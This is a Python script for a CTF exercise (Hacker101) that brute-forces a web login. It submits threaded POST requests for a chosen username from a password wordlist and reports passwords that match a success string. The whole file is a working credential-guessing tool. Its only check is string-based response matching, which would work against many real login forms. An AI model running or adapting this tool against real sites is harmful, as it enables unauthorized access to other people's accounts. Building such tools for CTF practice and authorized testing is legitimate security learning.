#!/usr/bin/env python3
# h101_login.py

import pathlib
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, Future
from queue import Queue

import click
import requests


class H101Login:
    """
    This class is for brute forcing passwords at hacker101 CTF level 2.
    """

    def __init__(self, url: str, username: str, wordlist_file: pathlib.Path, max_threads: int, valid_string: str,
                 invalid_string: str) -> None:
        self.url: str = url
        self.username = username
        self.wordlist_file: pathlib.Path = wordlist_file
        self.max_threads = max_threads
        self.valid_string = valid_string
        self.invalid_string = invalid_string.strip()
        self.session = requests.Session()
        self.data = {"username": "", "password": ""}
        self.word_queue = Queue()
        self.found_passwd = []
        self.futures = Queue()

    def _loop_words(self, seq_number, word):
        word = word.strip()
        if word != "":
            data = {"username": self.username, "password": word}
            response = self.send_request(data)
            self.check_response(seq_number, word, response)

    def create_queue(self, wordlist):
        print("[+] Generating words queue...")
        for word in wordlist:
            self.word_queue.put(word)

    def loop_words(self, wordlist):
        self.create_queue(wordlist)
        print("[+] Queue successfully generated...")
        print(f"[*] Attempting login with username: {self.username}")
        with ThreadPoolExecutor(max_workers=10) as executor:
            seq_number = 1
            try:
                while not self.word_queue.empty():
                    future = executor.submit(self._loop_words, seq_number, self.word_queue.get())
                    self.futures.put(future)
                    seq_number += 1
            except KeyboardInterrupt:
                self.close()

    def send_request(self, data) -> requests.Session.post:
        response = self.session.post(url=self.url, data=data)
        return response

    def check_response(self, seq_number, word, response):
        try:
            content = response.content.decode()
            if self.invalid_string not in content:
                if self.valid_string in content:
                    print(f"\n[+] Found password: {word}")
                    self.found_passwd.append(word)
                    print(f"\tTotal found passwords ({len(self.found_passwd)}): {self.found_passwd}")
                else:
                    print(f"\n[-] Unknown response: \n{content}", end="")
            else:
                # Print the ANSI escape code to hide the cursor
                # print("\033[?25l", end="")
                # Print the padded string with a carriage return
                print(f"\r[*] Attempted requests: {seq_number}. Current password: {word}", end=" " * 10)
                # Flush stdout to ensure immediate output
                sys.stdout.flush()
            # time.sleep(0.2)
        except KeyboardInterrupt:
            self.close()

    def start_words_loop(self):
        print("[+] Reading wordlist...")
        with open(self.wordlist_file, "r") as wl:
            self.loop_words(wl.readlines())

    def close(self):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while not self.futures.empty():
                future = self.futures.get()
                if isinstance(future, Future):
                    if not future.cancelled():
                        future.cancel()
            executor.shutdown(wait=True)
        sys.exit("[-] Detected KeyboardInterrupt. Quitting...")

    def run(self):
        try:
            self.start_words_loop()
        except KeyboardInterrupt:
            self.close()
        finally:
            # Print the ANSI escape code to show the cursor again
            print("\033[?25h")


@click.command(
    help="""
        This app brute forces passwords at hacker101 CTF level 3.
        """
)
@click.option(
    "-u", "--url", "url",
    required=True,
    help="Type the target URL.",
    type=str,
)
@click.option(
    "-l", "--username", "username",
    help="Type the number of concurrent threads.",
    prompt="Type the username for brute-forcing.",
    default="admin",
    required=True,
    type=str,
)
@click.option(
    "-w", "--wordlist", "wordlist",
    required=True,
    help="Type the path to wordlist file.",
    type=pathlib.Path,
)
@click.option(
    "-m", "--mas_threads", "max_threads",
    help="Type the number of concurrent threads.",
    default=10,
    required=True,
    type=int,
)
@click.option(
    "-v", "--valid_string", "valid_string",
    help="Type successful login string.",
    prompt="Successful login string",
    default="Logged In",
    required=True,
    type=str
)
@click.option(
    "-i", "--invalid_string", "invalid_string",
    help="Type unsuccessful login string.",
    prompt="Unsuccessful login string",
    default="Invalid password",
    required=True,
    type=str
)
def main(url, username, wordlist, max_threads, valid_string, invalid_string):
    login_bypass_robot = H101Login(url, username, wordlist, max_threads, valid_string, invalid_string)
    login_bypass_robot.run()


if __name__ == "__main__":
    main()
